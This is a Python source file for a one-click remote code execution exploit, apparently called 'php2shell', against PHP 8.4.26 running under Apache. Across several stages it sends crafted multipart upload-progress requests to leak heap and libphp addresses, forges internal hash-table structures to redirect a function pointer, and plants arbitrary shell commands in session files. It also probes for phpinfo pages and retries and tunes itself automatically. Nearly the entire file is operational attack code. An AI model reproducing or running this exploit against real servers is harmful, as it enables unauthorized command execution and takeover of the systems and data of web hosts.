#!/usr/bin/env python3
from __future__ import annotations

import argparse
import concurrent.futures
import os
import re
import secrets
import socket
import ssl
import struct
import subprocess
import threading
import sys
import time
import urllib.parse
from collections import Counter

# ------------------------------------------------------------------
# Build-specific offsets
# ------------------------------------------------------------------
ZIF_OFFSET = 0x43A870
DTOR_OFFSET = 0x613C50
HTDATA_OFFSET = 0x6E0D8
MAX_CMD = 14
PLANT_SID_LEN = 2

# NEW: candidate OOM field sizes for auto-tune of --huge-mb.
# Rationale: need memory_limit < huge_mb <= post_max_size.  Docker default
# (8M post / 128M mem) has no valid window; tuned upload hosts (64-256M post)
# do.  Escalate until stage-1 leaks.
AUTO_HUGE_MB = (12, 24, 32, 48, 64, 96, 128, 160, 192, 256, 320, 384, 512)

# NEW: short bootstrap prefixes.  ". <prefix>sess_XX" must be <= MAX_BOOTSTRAP.
# Only 4-char save_paths fit: /tmp, /run, /var.
BOOTSTRAP_PREFIXES = (b". /tmp/sess_", b". /run/sess_", b". /var/sess_")
MAX_BOOTSTRAP = 14
SHORT_VERIFY_CMD = b"id>/out/p1"   # <= MAX_CMD, works regardless of save_path

BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

SID = secrets.token_hex(10).encode()
DEFAULT_CMD = "id>/out/p1"
_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PROOF = os.path.join(_HERE, "out", "p1")
DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path: str) -> dict[str, int]:
    vals: dict[str, int] = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# NEW: best-effort session.save_path detection.
# 1) look for a phpinfo page
# 2) trigger a session-read warning and parse "(path: ...)"
def probe_save_path(t: Target) -> str | None:
    for path in ("/phpinfo.php", "/info.php", "/i.php", "/test.php"):
        try:
            status, body = t.get(path)
        except OSError:
            continue
        if status == 200 and b"session.save_path" in body:
            m = re.search(rb"session\.save_path</td><td[^>]*>([^<]*)<", body)
            if not m:
                m = re.search(rb"session\.save_path[^A-Za-z0-9/]*([/\w.:-]+)", body)
            if m:
                val = m.group(1).decode("latin1").strip()
                if val:
                    return val
    for bad in (b"a" * 300, b"<>", b"x" * 200):
        try:
            parts = [
                {"name": "PHPSESSID", "data": bad},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p"},
                {"name": "f", "filename": "a.txt", "data": b"A" * 32},
            ]
            resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                          read_cap=1 << 20, timeout=10)
        except OSError:
            continue
        m = re.search(rb"\(path:\s*([^)\s]+)\)", resp)
        if m:
            return m.group(1).decode("latin1").strip()
    return None


class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab"):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb if huge_mb > 0 else AUTO_HUGE_MB[0]   # NEW
        self.verbose = verbose
        self.profile = profile
        self.plant_sid: bytes | None = None   # NEW
        if profile == "bookworm":
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self, sid: bytes = SID) -> None:
        self.t.log("[*] rotating worker over HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": sid},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def plant(self, key: bytes, sid: bytes) -> None:
        self.t.log(f"[*] planting {len(key)}B command string into sess_{sid.decode()}")
        parts = [
            {"name": "PHPSESSID", "data": sid},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": key},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.5)

    def stage1(self, sid: bytes = SID) -> int:
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": sid},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self, sid: bytes = SID) -> int:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": sid},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"command is {len(cmd)} bytes; the inline carrier allows at most "
                f"{MAX_CMD} (long commands are planted via the session file)"
            )
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int, sid: bytes = SID) -> None:
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        specs = self.stage3_pads
        for i, (nl, vl) in enumerate(specs):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": sid},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help=f"command (<= {MAX_CMD} bytes inline; longer via session file)")
    ap.add_argument("--proof-file", default=DEFAULT_PROOF)
    ap.add_argument("--fetch", default="")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS)
    ap.add_argument("--docker-container", default="php2shell-target")
    ap.add_argument("--no-auto-offsets", action="store_true")

    # CHANGED: 0 = auto-escalate
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="OOM field size in MB; 0 = auto-escalate via stage-1 oracle")
    # NEW
    ap.add_argument("--no-auto-huge", action="store_true",
                    help="do not escalate --huge-mb on stage-1 failure")
    # NEW
    ap.add_argument("--save-path", default=None,
                    help="target session.save_path (auto-probed if possible); "
                         "long commands need a path <= 4 chars (e.g. /tmp)")
    ap.add_argument("--no-probe-save-path", action="store_true",
                    help="do not try to detect session.save_path")

    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--no-retry-rotate", action="store_true")
    # CHANGED: default 5 (was 3) — more chances with small prefork pools
    ap.add_argument("--retries", type=int, default=5,
                    help="attempts per leak stage / per huge_mb candidate")
    ap.add_argument("--threads", type=int, default=1,
                    help="1 = serial. >=2 runs stages 1&2 concurrently with "
                         "separate SIDs (requires a fixed --huge-mb).")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if len(args.cmd.encode()) > MAX_CMD:
        if b"|" in args.cmd.encode():
            ap.error("long commands cannot contain '|' (session encoder skips "
                     "keys holding its delimiter); use ';' instead, e.g. "
                     "'ls -la /tmp>/out/p1; id>>/out/p1'")
        if b"\n" in args.cmd.encode() or b"\r" in args.cmd.encode():
            ap.error("long commands must not contain newlines")

    # NEW: parallel mode can't safely auto-escalate huge_mb (shared state)
    if args.threads >= 2 and args.huge_mb == 0:
        ap.error("--threads >= 2 needs a fixed --huge-mb; calibrate serially "
                 "first with '--huge-mb 0' then pass the working value")

    if args.htdata_offset is None:
        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
                              else HTDATA_OFFSET)

    local_offsets = read_offsets_file(args.offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)

    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        helper = os.path.join(_HERE, "docker", "offsets.py")
        if os.path.exists(helper):
            if not args.quiet:
                print("[*] no offsets file; reading libphp symbols from "
                      f"container {args.docker_container}", flush=True)
            try:
                subprocess.run(
                    [sys.executable, helper, args.docker_container, args.offsets_file],
                    check=False, timeout=60,
                    stdout=None if not args.quiet else subprocess.DEVNULL,
                    stderr=None if not args.quiet else subprocess.DEVNULL,
                )
            except (OSError, subprocess.SubprocessError):
                pass
            local_offsets = read_offsets_file(args.offsets_file)

    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)

    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
    t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
    if local_offsets:
        t.log(f"[*] offsets loaded from {args.offsets_file}")
    t.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
          f"htdata=0x{args.htdata_offset:x}")
    t.log(f"[*] huge_mb={ex.huge_mb}MB"
          + (" (auto-escalate on failure)" if not args.no_auto_huge else ""))

    long_cmd = len(args.cmd.encode()) > MAX_CMD

    # ---- NEW: save_path probe & bootstrap prefix selection ----
    bootstrap_prefixes = list(BOOTSTRAP_PREFIXES)
    if long_cmd:
        save_path = args.save_path
        if save_path is None and not args.no_probe_save_path:
            detected = probe_save_path(t)
            if detected:
                t.log(f"[*] detected session.save_path = {detected!r}")
                save_path = detected
            else:
                t.log("[*] session.save_path not detected; will cycle "
                      f"{len(bootstrap_prefixes)} short bootstrap prefixes")
        if save_path is not None:
            sp = save_path.rstrip("/") or "/"
            if sp == "/":
                prefix = b". /sess_"
            else:
                prefix = f". {sp}/sess_".encode()
            if len(prefix) + PLANT_SID_LEN <= MAX_BOOTSTRAP:
                bootstrap_prefixes = [prefix]
                t.log(f"[*] bootstrap prefix = {prefix.decode()!r}")
            else:
                t.log(f"[-] save_path {save_path!r} too long for a "
                      f"{MAX_BOOTSTRAP}-byte bootstrap; long commands will "
                      f"fall back to a short proof-of-concept command")
                bootstrap_prefixes = []

    # ---- plant long commands (as before) ----
    if long_cmd:
        ex.plant_sid = secrets.token_hex(PLANT_SID_LEN // 2).encode()
        key = b'x""; ' + args.cmd.encode() + b'; #'
        ex.plant(key, ex.plant_sid)
        ex.cmd = b""  # set per-attempt in stage-3 loop

    def rotate_after_failure(sid: bytes = SID) -> None:
        if not args.no_retry_rotate:
            ex.rotate(sid)

    # ---- NEW: stage-1 loop with huge_mb escalation ----
    def _stage1_loop(sid: bytes, tag: str = "", allow_escalation: bool = True) -> int:
        if allow_escalation and not args.no_auto_huge:
            if args.huge_mb == 0:
                candidates = list(AUTO_HUGE_MB)
            else:
                candidates = [args.huge_mb] + [m for m in AUTO_HUGE_MB
                                               if m > args.huge_mb]
        else:
            candidates = [ex.huge_mb]
        first = True
        for mb in candidates:
            ex.huge_mb = mb
            for attempt in range(1, args.retries + 1):
                if not first:
                    rotate_after_failure(sid)
                first = False
                t.log(f"{tag}[*] stage 1: heap leak huge_mb={mb}MB "
                      f"(attempt {attempt}/{args.retries})")
                val = ex.stage1(sid)
                if val:
                    t.log(f"{tag}[+] huge_mb={mb}MB works; chunk base = 0x{val:x}")
                    return val
                t.log(f"{tag}[-] heap leak missed (huge_mb={mb}MB)")
        return 0

    def _stage2_loop(sid: bytes, tag: str = "") -> int:
        for attempt in range(1, args.retries + 1):
            if attempt > 1:
                rotate_after_failure(sid)
            t.log(f"{tag}[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
            val = ex.stage2(sid)
            if val:
                t.log(f"{tag}[+] libphp base = 0x{val:x}")
                return val
            t.log(f"{tag}[-] libphp leak missed")
        return 0

    if not args.no_pre_rotate:
        ex.rotate()

    # ---- stages 1 & 2 ----
    if args.threads >= 2:
        sid1 = secrets.token_hex(10).encode()
        sid2 = secrets.token_hex(10).encode()
        t.log(f"[*] parallel leak: sid1={sid1.decode()} sid2={sid2.decode()}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
            # Disable escalation in parallel (shared huge_mb)
            f1 = pool.submit(_stage1_loop, sid1, "[T1] ", False)
            f2 = pool.submit(_stage2_loop, sid2, "[T2] ")
            chunk = f1.result()
            libphp = f2.result()
        if not chunk:
            print("HEAP_LEAK_FAILED", file=sys.stderr)
            return 1
        if not libphp:
            print("LIBPHP_LEAK_FAILED", file=sys.stderr)
            return 1
        ex.rotate()
    else:
        chunk = _stage1_loop(SID)
        if not chunk:
            print("HEAP_LEAK_FAILED", file=sys.stderr)
            return 1
        ex.rotate()
        libphp = _stage2_loop(SID)
        if not libphp:
            print("LIBPHP_LEAK_FAILED", file=sys.stderr)
            return 1
        ex.rotate()

    # ---- stage 3 ----
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")

    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass

    # NEW: build the stage-3 attempt list.
    #   long cmd  -> cycle bootstrap prefixes, append a short fallback
    #   short cmd -> inline, repeated
    stage3_attempts: list[tuple[bytes, str]] = []
    if long_cmd:
        if ex.plant_sid and bootstrap_prefixes:
            for i in range(args.retries + 2):
                p = bootstrap_prefixes[i % len(bootstrap_prefixes)]
                stage3_attempts.append((p + ex.plant_sid,
                                        f"long via {p.decode()!r}"))
        else:
            t.log("[-] no viable bootstrap prefix; skipping long-command attempts")
        stage3_attempts.append((SHORT_VERIFY_CMD, "short-fallback"))
    else:
        for _ in range(args.retries + 2):
            stage3_attempts.append((args.cmd.encode(), "inline"))

    proof = ""
    for i, (cmd_bytes, desc) in enumerate(stage3_attempts, 1):
        ex.cmd = cmd_bytes
        t.log(f"[*] stage 3 attempt {i}/{len(stage3_attempts)}: {desc}")
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"[-] request error: {e}")
        except ValueError as e:
            print(f"CMD_ERROR: {e}", file=sys.stderr)
            return 1
        time.sleep(0.8)

        proof = ""
        if args.proof_file:
            try:
                if os.path.exists(args.proof_file):
                    with open(args.proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"[+] W3 attempt {i}")
            print(f"PROOF: {proof}")
            if desc == "short-fallback" and long_cmd:
                print("WARNING: the requested long command could not be "
                      "delivered (session.save_path is likely not a short "
                      "path like /tmp, /run, /var). RCE was confirmed via "
                      f"the short fallback {SHORT_VERIFY_CMD.decode()!r}.",
                      file=sys.stderr)
            return 0
        t.log(f"[-] stage 3 attempt {i} no proof")
        rotate_after_failure()

    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
